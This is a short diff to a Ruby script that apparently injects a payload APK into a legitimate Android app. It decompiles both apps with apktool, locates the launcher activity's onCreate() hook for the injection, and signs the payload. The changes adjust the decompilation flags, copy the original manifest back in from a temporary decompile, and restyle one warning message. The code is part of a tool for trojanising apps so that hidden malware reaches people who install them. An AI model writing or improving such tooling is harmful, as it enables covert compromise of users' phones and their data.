@@ -192,7 +192,11 @@ print "[*]─➤ Signing payload..\n".cyan
 `cp #{apkfile} original.apk 2>&1`
 
 print "[*]─➤ Decompiling orignal APK..\n".cyan
-`apktool d $(pwd)/original.apk -o $(pwd)/original`
+`apktool d -f -r $(pwd)/original.apk -o $(pwd)/original`
+print "[*]─➤ Ignoring the resource decompilation..\n".cyan
+`apktool d -f $(pwd)/original.apk -o $(pwd)/original.tmp`
+`cat $(pwd)/original.tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
+`rm -rf $(pwd)/original.tmp`
 print "[*]─➤ Decompiling payload APK..\n".cyan
 `apktool d $(pwd)/payload.apk -o $(pwd)/payload`
 
@@ -202,13 +206,12 @@ f.close
 
 print "[*]─➤ Locating onCreate() hook..\n".cyan
 
-
 launcheractivity = findlauncheractivity(amanifest)
 smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
 	activitysmali = File.read(smalifile)
 rescue Errno::ENOENT
-  print "[!]─➤ Unable to find correct hook automatically\n".yellow
+  print "[w]─➤ Unable to find correct hook automatically\n".red
 	begin
 		results=scrapeFilesForLauncherActivity()
 		smalifile=results[0]
